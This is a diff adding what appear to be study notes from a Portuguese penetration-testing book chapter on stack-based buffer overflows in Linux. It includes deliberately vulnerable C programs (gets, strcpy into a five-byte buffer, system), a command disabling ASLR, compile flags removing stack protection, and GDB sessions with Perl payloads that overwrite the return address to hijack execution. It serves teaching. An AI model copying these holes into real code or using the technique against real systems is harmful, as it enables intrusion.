@@ -1,0 +1,693 @@
+#include <stdio.h>
+main() {
+   char *name;
+   char *dangerous_system_command;
+   name = (char *) malloc(10);
+   
+   dangerous_system_command = (char *) malloc(128);
+   printf("Address of name is %d\n", name);
+   printf("Address of command is %d\n", dangerous_system_command);
+   sprintf(dangerous_system_command, "echo %s", "Hello world!");
+   printf("What's your name?");
+   gets(name); // 0123456789123456ls
+   
+   system(dangerous_system_command);
+}
+
+
+sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space' # desabilita a proteção contra buffer overflow
+
+overflowtest.c
+
+#include <string.h>
+#include <stdio.h>
+void overflowed() {
+  printf("%s\n", "Execution Hijacked");
+}
+
+void function1(char *str) {
+  char buffer[5];
+  strcpy(buffer, str);
+}
+
+void main(int argc, char *argv[]) {
+  function1(argv[1]);
+  printf("%s\n", "Executed normally");
+}
+
+gcc -g -fno-stack-protector -z execstack -o overflowtest overflowtest.c
+-g adiciona informações extras de debugging
+-z execstack do compilador torna a pilha executável
+
+Observe que, em circunstâncias normais, overflowed jamais é chamado, portanto "Execution Hijacked" não deverá aparecer nunca no console. (Você verá por que essa função está presente quando provocarmos o buffer overflow e assumirmos o controle do programa.)
+
+$ ./overflowtest AAAA
+Executed normally
+
+$ ./overflowtest AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+
+Se nossa string tiver cinco caracteres de tamanho e se copiarmos 100 caracteres, os outros 95 acabarão sobrescrevendo dados nos endereços de memória adjacentes da pilha.
+
+Antes de o frame ser inserido na pilha, main inseriu o seu endereço de retorno nela para indicar em que ponto a execução deverá continuar após function1 retornar. Se a string que copiarmos em buffer for longa o suficiente, iremos sobrescrever a memória de buffer até o EBP, o endereço de retorno e até mesmo o stack frame de main.
+
+
+gdb overflowtest
+(gdb) list 1,16
+1
+#include <string.h>
+2
+#include <stdio.h>
+3
+4
+void overflowed() {
+5
+printf("%s\n", "Execution Hijacked");
+6
+}
+7
+8
+void function(char *str){
+9
+char buffer[5];
+10
+strcpy(buffer, str);
+11
+}
+12
+void main(int argc, char *argv[])
+13
+{
+14
+function(argv[1]);
+15
+printf("%s\n", "Executed normally");
+16
+}
+(gdb)
+
+Inicialmente, vamos fazer uma pausa no programa antes de main chamar function1 em 14, imediatamente antes de a instrução ser executada. Também definimos mais dois breakpoints: dentro de function1, imediatamente antes de strcpy ser executado em 10, e logo depois disso, em 11.
+(gdb) break 14
+Breakpoint 1 at 0x8048433: file overflowtest.c, line 14.
+(gdb) break 10
+Breakpoint 2 at 0x804840e: file overflowtest.c, line 10.
+(gdb) break 11
+Breakpoint 3 at 0x8048420: file overflowtest.c, line 11.
+(gdb)
+
+Antes de provocar um overflow em buffer e fazer o programa causar uma falha, vamos executá-lo somente com quatro As, como mostrado aqui, e vamos observar a memória à medida que o programa for executado normalmente.
+(gdb) run AAAA
+Starting program: /home/georgia/overflowtest AAAA
+Breakpoint 1, main (argc=2, argv=0xbffff5e4) at overflowtest.c:14
+14
+function(argv[1]);
+
+Usamos o comando run do GDB, seguido dos argumentos, para iniciar o programa no depurador. Nesse caso, executamos o programa com quatro As como argumento. Atingimos o nosso primeiro breakpoint imediatamente antes de a função function1 ser chamada, momento em que podemos examinar a memória do programa usando o comando x do GDB.
+O GDB precisa saber qual parte da memória queremos ver e como ela deverá ser exibida. O conteúdo da memória pode ser mostrado em formatos octal, hexadecimal, decimal ou binário. Veremos muitos hexadecimais em nossa jornada pelo desenvolvimento de exploits, portanto vamos usar a flag x para dizer ao GDB que apresente nossa memória em formato hexadecimal.
+Também podemos exibir a memória em incrementos de um byte, meia palavra de dois bytes (halfword), uma palavra de quatro bytes (word) e um gigante de oito bytes (giant). Vamos dar uma olhada em 16 palavras em formato hexadecimal, começando no registrador ESP, por meio do comando x/16xw $esp, como mostrado na listagem 16.4.
+
+(gdb) x/16xw $esp
+0xbffff540:
+0xb7ff0f50
+0xbffff550:
+0x08048470
+0xbffff560:
+0x00000002
+0xbffff570:
+0x00000001
+
+0xbffff560
+0x08048340
+0xbffff5e4
+0x00000001
+
+0xbffff5b8
+0xbffff5b8
+0xbffff5f0
+0x00000000
+
+0xb7e8c685
+0xb7e8c685
+0xb7fe2b38
+0x08048249
+
+O comando x/16xw $esp exibe 16 palavras de quatro bytes em formato hexadecimal, começando pelo ESP. Lembre-se de que, conforme mencionado anteriormente neste capítulo, o ESP marca o endereço mais baixo de memória de nossa pilha.
+Como o nosso primeiro breakpoint causou uma pausa na execução imediatamente antes da chamada a function1, o ESP está no topo do stack frame de main.
+A apresentação da memória no GDB na listagem 16.4 pode parecer um pouco confusa à primeira vista, portanto vamos detalhá-la. Na parte mais à esquerda, temos nossos endereços de memória em incrementos de 16 bytes, seguidos do conteúdo da memória nesses endereços. Nesse caso, os primeiros quatro bytes correspondem ao conteúdo do ESP, seguido da memória adicional, começando no ESP e prosseguindo para baixo na pilha.
+Podemos encontrar o EBP, que aponta para a parte de baixo (ou para o endereço mais alto) do stack frame de main, ao analisar o EBP, como mostrado aqui, por meio do comando x/1xw $ebp.
+(gdb) x/1xw $ebp
+0xbffff548:
+0xbffff5b8
+(gdb)
+
+Esse comando permite examinar uma palavra hexadecimal a partir do EBP para encontrar o local da memória e o conteúdo do registrador EBP. De acordo com a saída, o stack frame de main tem a seguinte aparência:
+0xbffff540:
+0xb7ff0f50
+0xbffff560
+0xbffff5b8
+
+Como você pode ver, não há muitos dados aí, porém, mais uma vez, tudo o que main faz é chamar outra função e, em seguida, exibir uma linha de texto na tela;
+não há nenhum processamento pesado sendo exigido.
+Com base no que sabemos sobre a pilha, podemos esperar que, quando deixarmos o programa continuar e function1 for chamada, o endereço de retorno de main e um stack frame para function1 serão inseridos na pilha. Lembre-se de que a pilha cresce em direção aos endereços mais baixos de memória, portanto seu topo estará em um endereço de memória mais baixo quando atingirmos nosso próximo breakpoint dentro de function1. Lembre-se de que o nosso próximo breakpoint está no interior de function1, imediatamente antes de o comando strcpy ser executado. Utilize o comando continue para deixar o programa executar até o próximo breakpoint, como mostrado na listagem 16.5.
+
+Listagem 16.5 – Breakpoint antes do comando strcpy
+(gdb) continue
+Continuing.
+Breakpoint 2, function (str=0xbffff74c "AAAA") at overflowtest.c:10
+10
+strcpy(buffer, str);
+(gdb) x/16xw $esp
+0xbffff520:
+0xb7f93849
+0xbffff530:
+0xb7fcfff4
+0xbffff540:
+0xbffff74f
+0xbffff550:
+0x08048470
+
+0x08049ff4
+0x08049ff4
+0xbffff560
+0x08048340
+
+0xbffff538
+0xbffff548
+0xbffff5b8
+0xbffff5b8
+
+0x080482e8
+0x08048443
+0xb7e8c685
+0xb7e8c685
+
+(gdb) x/1xw $ebp
+0xbffff538:
+0xbffff548
+
+Após usar o comando continue para executar o programa até o próximo breakpoint, examine o ESP em  e o EBP em  para ver o conteúdo do stack frame de function1. O stack frame de function1 está sendo mostrado aqui:
+0xbffff520:
+0xbffff530:
+
+0xb7f93849
+0x08049ff4
+0xbffff538
+0xb7fcfff4 0x08049ff4 0xbffff548
+
+0x080482e8
+
+O stack frame de function1 é um pouco maior que o de main. Há um pouco de memória alocada para a variável local buffer, juntamente com um pouco de espaço extra para o strcpy trabalhar, porém certamente não há espaço suficiente para 30
+ou 40 As. Lembre-se de que, de acordo com o último breakpoint, o stack frame de main iniciava no endereço de memória 0xbffff540. Com base em nosso conhecimento sobre a pilha, 0x08048443 – o endereço de memória de quatro bytes entre o stack frame de function1 e o stack frame de main – deve corresponder ao nosso endereço de retorno para main. Vamos fazer o disassembly de main usando o comando disass, como mostrado na listagem 16.6, para ver em que ponto 0x08048443 aparece.
+
+Disassembly da função main
+(gdb) disass main
+Dump of assembler code for function main:
+0x08048422 <main+0>:
+lea
+0x4(%esp),%ecx
+0x08048426 <main+4>:
+and
+$0xfffffff0,%esp
+0x08048429 <main+7>:
+pushl -0x4(%ecx)
+0x0804842c <main+10>:
+push %ebp
+0x0804842d <main+11>:
+mov
+%esp,%ebp
+0x0804842f <main+13>:
+push %ecx
+0x08048430 <main+14>:
+sub
+$0x4,%esp
+0x08048433 <main+17>:
+mov
+0x4(%ecx),%eax
+0x08048436 <main+20>:
+add
+$0x4,%eax
+0x08048439 <main+23>:
+mov
+(%eax),%eax
+0x0804843b <main+25>:
+mov
+%eax,(%esp)
+0x0804843e <main+28>:
+call 0x8048408 <function1> 
+0x08048443 <main+33>:
+0x0804844a <main+40>:
+0x0804844f <main+45>:
+0x08048452 <main+48>:
+0x08048453 <main+49>:
+0x08048454 <main+50>:
+0x08048457 <main+53>:
+End of assembler dump.
+
+movl call add pop pop lea ret
+
+$0x8048533,(%esp) 
+0x804832c <puts@plt>
+$0x4,%esp
+%ecx
+%ebp
+-0x4(%ecx),%esp
+
+Se você não for fluente em código assembly, não se preocupe. A instrução que estamos procurando salta aos olhos: em 0x0804843e , main chama o endereço de memória de function1. Parece lógico que a próxima instrução a ser executada quando function1 sair (e, desse modo, o nosso endereço de retorno) será a próxima instrução da lista. E, com certeza, a próxima linha em  mostra o endereço de retorno que encontramos na pilha. Tudo parece exatamente como a teoria diz que deveria ser.
+Vamos deixar o programa continuar e ver o que acontece na memória quando nossos quatro As forem copiados para o buffer. Depois de o programa efetuar uma pausa no terceiro breakpoint, examine a memória da forma usual, conforme mostrado na listagem 16.7.
+
+Capítulo 16 ■ Buffer overflow com base em pilha no Linux
+
+449
+
+Listagem 16.7 – Analisando a memória no breakpoint 3
+(gdb) continue
+Continuing.
+Breakpoint 3, function (str=0xbffff74c "AAAA") at overflowtest.c:11
+11
+}
+(gdb) x/16xw $esp
+0xbffff520:
+0xbffff533
+0xbffff74c
+0xbffff538
+0x080482e8
+0x08048443
+0xbffff530:
+0x41fcfff4
+0x00414141 0xbffff500
+0xbffff540:
+0xbffff74c
+0xbffff560
+0xbffff5b8
+0xb7e8c685
+0xbffff550:
+0x08048470
+0x08048340
+0xbffff5b8
+0xb7e8c685
+(gdb) x/1xw $ebp
+0xbffff538:
+0xbffff500
+
+Conforme mostrado, ainda estamos dentro de function1, portanto a localização de nosso stack frame é a mesma. No stack frame de function1, podemos ver nossos quatro As  representados em hexadecimal como 41, seguidos de 00, que corresponde ao byte nulo final. Eles cabem perfeitamente em nosso buffer de cinco caracteres, portanto nosso endereço de retorno permanece intacto e tudo funciona conforme esperado quando deixamos o programa prosseguir, como mostrado na listagem 16.8.
+
+Listagem 16.8 – O programa termina normalmente
+(gdb) continue
+Continuing.
+Executed normally
+Program exited with code 022.
+(gdb)
+
+Com certeza, "Executed normally" (Executado normalmente) é exibido na tela.
+Agora vamos executar novamente o programa, desta vez, causando um overflow em nosso buffer com caracteres em excesso, e vamos observar o que acontece na memória.
+
+Provocando uma falha no programa com o GDB
+Podemos fornecer uma string longa de As, ou podemos fazer a linguagem de scripting Perl gerar essa string para nós, como mostrado na linguagem 16.9. (O
+Perl será prático mais adiante, quando tentarmos sequestrar a execução com um verdadeiro endereço de memória, em vez de provocarmos uma falha no programa.)
+
+450
+
+Testes de invasão
+
+Listagem 16.9 – Executando o programa com 30 As como argumento
+(gdb) run $(perl -e 'print "A" x 30') 
+Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 30')
+Breakpoint 1, main (argc=2, argv=0xbffff5c4) at overflowtest.c:14
+14
+function(argv[1]);
+(gdb) x/16xw $esp
+0xbffff520:
+0xb7ff0f50
+0xbffff530:
+0x08048470
+0xbffff540:
+0x00000002
+0xbffff550:
+0x00000001
+
+0xbffff540
+0x08048340
+0xbffff5c4
+0x00000001
+
+0xbffff598
+0xbffff598
+0xbffff5d0
+0x00000000
+
+0xb7e8c685
+0xb7e8c685
+0xb7fe2b38
+0x08048249
+
+(gdb) x/1xw $ebp
+0xbffff528:
+0xbffff598
+(gdb) continue
+
+Nesse caso, dizemos ao Perl para executar o comando print a fim de criar uma string de 30 As e fornecemos o resultado como argumento para overflowtest .
+Quando strcpy tenta colocar uma string longa como essa em nosso buffer de cinco caracteres, podemos esperar ver partes de nossa pilha sendo sobrescrita com As. Quando atingimos nosso primeiro breakpoint, ainda estamos no main e tudo parece normal até então. O problema não deverá surgir até o nosso terceiro breakpoint, após strcpy ter sido executado com excesso de As.
+NOTA
+
+O stack frame de main continua com tamanho de 12 bytes, embora tenha deslocado 32 bytes na pilha. Isso se deve a mudanças no tamanho do argumento da linha de comando e outros fatores. O tamanho do stack frame será consistente no restante do programa.
+
+Vamos observar um aspecto no segundo breakpoint na listagem 16.10, antes de prosseguirmos para a parte realmente interessante.
+
+Listagem 16.10 – Analisando a memória no breakpoint 2
+Breakpoint 2, function (str=0xbffff735 'A' <repeats 30 times>)
+at overflowtest.c:10
+10
+strcpy(buffer, str);
+(gdb) x/16xw $esp
+0xbffff500:
+0xb7f93849
+0xbffff510:
+0xb7fcfff4
+0xbffff520:
+0xbffff735
+0xbffff530:
+0x08048470
+
+0x08049ff4
+0x08049ff4
+0xbffff540
+0x08048340
+
+0xbffff518
+0xbffff528
+0xbffff598
+0xbffff598
+
+0x080482e8
+0x08048443
+0xb7e8c685
+0xb7e8c685
+
+Capítulo 16 ■ Buffer overflow com base em pilha no Linux
+
+451
+
+(gdb) x/1xw $ebp
+0xbffff518:
+0xbffff528
+(gdb) continue
+Continuing.
+
+Você pode ver aqui que o stack frame de function1 também foi deslocado em 32
+bytes. Observe também que o nosso endereço de retorno continua armazenando o endereço de memória 0x08048443 . Embora o nosso stack frame tenha se deslocado um pouco, as instruções a serem executadas estão no mesmo lugar na memória.
+Utilize o comando continue novamente para prosseguir até o terceiro breakpoint. É
+nesse ponto que a situação se torna interessante, como mostrado na listagem 16.11.
+
+Listagem 16.11 – Endereço de retorno sobrescrito pelos As
+Breakpoint 3, function (str=0x41414141 <Address 0x41414141 out of bounds>)
+at overflowtest.c:11
+11
+}
+(gdb) x/16xw $esp
+0xbffff500:
+0xbffff513
+
+0xbffff733
+
+0xbffff518
+
+0x080482e8
+
+0xbffff510:
+0xbffff520:
+0xbffff530:
+
+0x41414141
+0x41414141
+0x08048340
+
+0x41414141
+0x41414141
+0xbffff598
+
+0x41414141
+0x41414141
+0xb7e8c685
+
+0x41fcfff4
+0x41414141
+0x08040041
+
+(gdb) continue
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb)
+
+Vamos analisar novamente a memória em nosso terceiro breakpoint, imediatamente após strcpy, porém antes de function1 retornar para main. Dessa vez, não só
+o endereço de retorno foi sobrescrito pelos As em , mas parte do stack frame de main também foi sobrescrito. A essa altura, não há esperanças de o programa se recuperar.
+Quando function1 retorna, o programa tenta executar as instruções no endereço de retorno de main, porém esse endereço foi sobrescrito com nossos As, causando a esperada falha de segmentação (segmentation fault) quando se tenta executar a instrução no endereço de memória 41414141. (Nas próximas seções, discutiremos a substituição do endereço de retorno por algo que redirecione o programa para um código nosso, em vez de provocar uma falha.)
+
+452
+
+Testes de invasão
+
+Controlando o EIP
+Fazer o programa falhar é interessante por si só, porém, como desenvolvedores de exploit, nosso objetivo é sequestrar a execução, se possível, e fazer a CPU do alvo executar um código para nós. Quem sabe, ao manipular a falha, poderemos executar outras instruções que o desenvolvedor jamais teve a intenção de executar.
+No momento, nosso programa falha quando tentamos executar as instruções no endereço de memória 41414141, que está fora dos limites do programa. Devemos alterar nossa string de argumento e incluir um endereço de memória válido para que o nosso programa possa acessá-lo. Se pudermos substituir o endereço de retorno por outro local de memória válido, poderemos sequestrar a execução quando function1 retornar. Talvez o desenvolvedor tenha até mesmo deixado um código de depuração no programa e que poderá ser usado para demonstrar esse propósito. (Mas estou me adiantando um pouco aqui.)
+Para redirecionar a execução, inicialmente devemos determinar em que ponto o endereço de retorno está sendo sobrescrito pela nossa longa string de As. Vamos observar novamente a aparência de nossa pilha quando executarmos nosso programa normalmente, com apenas quatro caracteres em nosso argumento, como mostrado aqui.
+0xbffff520:
+0xbffff530:
+
+0xbffff533
+0x41fcfff4
+
+0xbffff74c
+0xbffff538
+0x080482e8
+0x00414141 0xbffff500 0x08048443
+
+Podemos ver em que local os quatro As  foram copiados na variável local buffer.
+Agora, lembre-se de que os quatro bytes imediatamente após o EBP  contêm o endereço de retorno 0x08048443 . Podemos ver que, após os quatro As, há mais cinco bytes no stack frame de function1, que vêm antes do endereço de retorno.
+Ao observar a memória, parece lógico que, se fornecermos um argumento que tenha um tamanho igual a 5 + 4 + 4 bytes ao nosso programa, os últimos quatro bytes irão sobrescrever o endereço de retorno. Podemos testar isso enviando um argumento com nove As, seguido de quatro Bs, ao nosso programa. Se o nosso programa falhar ao tentar executar a instrução no endereço de memória 42424242
+(a representação hexadecimal de B), saberemos que calculamos o nosso offset
+(deslocamento) corretamente.
+Podemos usar novamente o Perl para nos ajudar a criar nossa string de argumento, como mostrado na listagem 16.12.
+
+Capítulo 16 ■ Buffer overflow com base em pilha no Linux
+
+453
+
+Listagem 16.12 – Iniciando o programa com uma nova string de ataque
+(gdb) delete 1
+(gdb) delete 2
+(gdb) run $(perl -e 'print "A" x 9 . "B" x 4')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "B" x 4')
+
+Antes de executar o programa com esse novo argumento, apague os dois primeiros breakpoints usando delete, pois o estado da memória não será alterado de modo interessante até o nosso terceiro breakpoint, depois de strcpy ter sido executado.
+Inicie o programa usando Perl, com nove As seguidos de quatro Bs para a string de ataque. Como o programa provocou uma falha em sua última execução, você
+deverá responder se gostaria de reiniciá-lo. Digite y para yes (sim). Ao analisarmos a memória em nosso único breakpoint remanescente, tudo se parecerá como previsto, conforme mostrado na listagem 16.13.
+
+Listagem 16.13 – Sobrescrevendo o endereço de retorno com Bs
+Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
+11
+}
+(gdb) x/20xw $esp
+0xbffff510:
+0xbffff523
+0xbffff520:
+0x41fcfff4
+0xbffff530:
+0xbffff700
+0xbffff540:
+0x08048470
+0xbffff550:
+0x00000002
+
+0xbffff744
+0x41414141
+0xbffff550
+0x08048340
+0xbffff5d4
+
+0xbffff528
+0x41414141
+0xbffff5a8
+0xbffff5a8
+0xbffff5e0
+
+0x080482e8
+0x42424242
+0xb7e8c685
+0xb7e8c685
+0xb7fe2b38
+
+(gdb) continue
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb)
+
+No local em que vimos anteriormente o nosso endereço de retorno (0x08048443), agora temos 0x42424242. Se deixarmos o programa continuar, veremos que ele irá
+falhar ao tentar executar o endereço de memória composto dos quatro Bs .
+Novamente, esse endereço está fora dos limites, mas, pelo menos, agora sabemos em que local devemos colocar o endereço do código que queremos executar.
+
+454
+
+Testes de invasão
+
+Identificamos exatamente quais são os quatro bytes de nossa string de ataque que sobrescrevem o endereço de retorno. Lembre-se de que o endereço de retorno é
+carregado no EIP quando function1 retornar. Agora só precisamos encontrar um local mais interessante que 41414141 ou 42424242 para onde desviaremos a execução.
+
+Sequestrando a execução
+Determinamos o local de nossa string passada como argumento que sobrescreverá o endereço de retorno, porém ainda precisamos de algo para inserir aí.
+(Esse exemplo pode parecer um pouco artificial quando comparado aos demais exemplos de desenvolvimento de exploit que serão discutidos, porém ele ilustra bem os conceitos subjacentes.) Conseguimos manipular um problema com a função strcpy usada pelo programa para ir além da variável buffer e sobrescrever endereços adicionais de memória, incluindo o endereço de retorno.
+Ao observar novamente o nosso código-fonte de overflowtest.c, lembre-se de que o programa contém outra função além de main e de function1. A primeira função do programa, chamada overflowed, exibe "Execution Hijacked" (Execução sequestrada)
+no console e, em seguida, retorna. Essa função extra jamais é chamada quando o programa executa normalmente, porém, como indicado pela sua saída, podemos usá-la para sequestrar a execução.
+De volta ao nosso depurador, se pudermos encontrar o início de overflowed na memória, poderemos substituir nossos quatro Bs por esse endereço de memória, sobrescrever o endereço de retorno e forçar o programa a executar instruções que os desenvolvedores jamais tiveram a intenção de que fossem executadas. Temos o código-fonte e sabemos o nome da função que estamos procurando, portanto essa tarefa é trivial. Vamos simplesmente fazer o disassembly de overflowed e descobrir em que local ela está carregada na memória, como mostrado na listagem 16.14.
+
+Listagem 16.14 – Fazendo o disassembly de overflowed
+(gdb) disass overflowed
+Dump of assembler code for function overflowed:
+ 0x080483f4 <overflowed+0>: push %ebp
+0x080483f5 <overflowed+1>:
+mov
+%esp,%ebp
+0x080483f7 <overflowed+3>:
+sub
+$0x8,%esp
+0x080483fa <overflowed+6>:
+movl $0x8048520,(%esp)
+0x08048401 <overflowed+13>:
+call 0x804832c <puts@plt>
+0x08048406 <overflowed+18>:
+leave
+
+Capítulo 16 ■ Buffer overflow com base em pilha no Linux
+0x08048407 <overflowed+19>:
+End of assembler dump.
+(gdb)
+
+455
+
+ret
+
+Como você pode ver, o endereço de memória 0x80483f4  armazena a primeira instrução de overflowed. Se redirecionarmos nosso programa para esse local, ele executará todas as instruções dessa função.
+NOTA
+
+Isso não nos dará um reverse shell nem associará o alvo a uma botnet; somente exibirá "Execution Hijacked" na tela. Daremos uma olhada em sequestros de execução mais empolgantes nos exemplos de desenvolvimento de exploits nos próximos três capítulos.
+
+Podemos usar o Perl para nos ajudar a criar nossa string de argumento, que incluirá bytes hexadecimais para o endereço de memória que queremos usar para sobrescrever o endereço de retorno, como mostrado aqui:
+(gdb) run $(perl -e 'print "A" x 9 . "\x08\x04\x83\xf4"')
+Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "\x08\x04\x83\xf4"')
+
+Dessa vez, substituímos nossos quatro Bs por \x08\x04\x83\xf4, o que deverá redirecionar a execução para o início de overflowed. Porém isso não funciona como planejado, conforme mostrado na listagem 16.15.
+
+Listagem 16.15 – Os bytes do endereço de retorno estão invertidos
+Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
+11
+}ß
+(gdb) x/16xw $esp
+0xbffff510:
+0xbffff523
+0xbffff520:
+0x41fcfff4
+0xbffff530:
+0xbffff700
+0xbffff540:
+0x08048470
+
+0xbffff744
+0x41414141
+0xbffff550
+0x08048340
+
+0xbffff528
+0x41414141
+0xbffff5a8
+0xbffff5a8
+
+0x080482e8
+0xf4830408
+0xb7e8c685
+0xb7e8c685
+
+(gdb) continue
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0xf4830408 in ?? ()
+
+Como você pode ver, atingimos o nosso breakpoint conforme esperado, porém, ao analisar a memória, parece que temos um pequeno problema. O endereço de memória da primeira instrução em overflowed é 0x80483f4, mas o endereço de retorno em nossa pilha é 0xf4830408 . Os dígitos não estão totalmente invertidos, porém os bytes estão na ordem incorreta.
+
+456
+
+Testes de invasão
+
+Lembre-se de que dois dígitos hexadecimais compõem um byte. Quando deixamos o programa prosseguir, recebemos outro erro de violação de acesso por tentar executar dados em 0xf4830408. Sabemos que o programa causa uma falha porque o novo endereço de retorno está incorreto, portanto vamos ver, antes de tudo, por que esses bytes acabaram ficando fora de ordem para que possamos corrigir o problema.
+
+Ordem dos bytes (endianness)
+Quando estava aprendendo a desenvolver exploits pela primeira vez, gastei horas coçando a cabeça e me perguntando o que poderia possivelmente estar impedindo que meu exploit funcionasse. Eu havia me deparado com esse mesmo problema e, infelizmente, não havia prestado atenção às aulas de sistemas operacionais quando a ordem dos bytes (endianness) fora discutida.
+No romance As viagens de Gulliver de 1726, o personagem de Jonathan Swift mencionado no título sofre um naufrágio na ilha de Lilliput. Lilliput, naquela época, não estava em paz com a vizinha Blefuscu por causa de uma controvérsia sobre como quebrar um ovo da maneira correta. Em Lilliput, os ovos eram quebrados na extremidade menor (little end), e em Blefuscu, eles eram quebrados na extremidade maior (big end). Temos uma briga semelhante em ciência da computação em relação à ordem dos bytes. Os big endians acreditam que o byte mais significativo deve ser armazenado antes, enquanto os little endians armazenam o byte menos significativo antes. Nossa máquina virtual Ubuntu tem uma arquitetura
+Intel, que é little endian. Para estarmos de acordo com a arquitetura little-endian, devemos inverter os bytes de nosso endereço de memória, como mostrado aqui:
+(gdb) run $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')
+
+O uso do endereço de retorno \xf4\x83\x04\x08 com a ordem dos bytes invertida para a nossa arquitetura Intel resolve o nosso problema, conforme mostrado na listagem 16.16.
+
+Capítulo 16 ■ Buffer overflow com base em pilha no Linux
+
+457
+
+Listagem 16.16 – Sequestrando a execução com sucesso
+Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
+11
+}
+(gdb) x/16xw $esp
+0xbffff510:
+0xbffff523
+0xbffff520:
+0x41fcfff4
+0xbffff530:
+0xbffff700
+0xbffff540:
+0x08048470
+
+0xbffff744
+0x41414141
+0xbffff550
+0x08048340
+
+0xbffff528
+0x41414141
+0xbffff5a8
+0xbffff5a8
+
+0x080482e8
+0x080483f4
+0xb7e8c685
+0xb7e8c685
+
+(gdb) continue
+Continuing.
+Execution Hijacked 
+Program received signal SIGSEGV, Segmentation fault.
+0xbffff700 in ?? ()
+(gdb)
+
+Dessa vez, quando atingimos o breakpoint, nosso endereço de retorno parece estar correto. Com certeza, quando deixamos o programa continuar, "Execution
+Hijacked" (Execução Sequestrada) é exibido no console em , o que significa que sequestramos a execução com sucesso e que exploramos uma vulnerabilidade de buffer overflow.
+Para ver o resultado fora do depurador, executamos overflowtest a partir da linha de comando com um argumento que inclui o novo endereço de retorno, como mostrado aqui.
+georgia@ubuntu:~$ ./overflowtest $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')
+Execution Hijacked
+Segmentation fault
+
+Observe que, após o retorno de overflowed, o programa provoca uma falha de segmentação ao executar o endereço de memória bffff700. Esse endereço corresponde aos próximos quatro bytes da pilha após o nosso endereço de retorno. E, ao pensar novamente em como a memória funciona, isso faz sentido, porém o nosso código
+"malicioso" foi totalmente executado antes da falha. Depois que o stack frame de overflowed é removido da pilha, bffff700 parece estar no lugar do endereço de retorno.
+Enviamos a execução diretamente para overflowed sem que tenha sido feito o que normalmente se faz em uma chamada normal de função, por exemplo, salvar um endereço de retorno. Quando o stack frame de overflowed é removido da pilha, supõe-se que o próximo endereço de memória da pilha seja o endereço de retorno, porém esse é somente parte do stack frame de main, por isso houve uma falha.
+
+
+Resumo
+Neste capítulo, demos uma olhada em um programa C simples com uma vulnerabilidade de buffer overflow (ou seja, com o uso da função strcpy, que não
+é segura), em que os limites de arrays não são verificados, o que nos permite escrever na memória adjacente. Exploramos esse problema ao criar uma string mais longa do que o esperado pelo programa e passando-a na linha de comando.
+Sequestramos a execução do programa ao sobrescrever o endereço de retorno de uma função com nosso próprio valor. Enviamos a execução para outra função incluída no programa original.
+Agora que você já viu um exemplo básico de um overflow baseado em pilha, vamos prosseguir para algo um pouco mais complexo. No próximo capítulo, nosso exemplo irá focar em um alvo baseado em Windows e em um programa-alvo do mundo real.
+
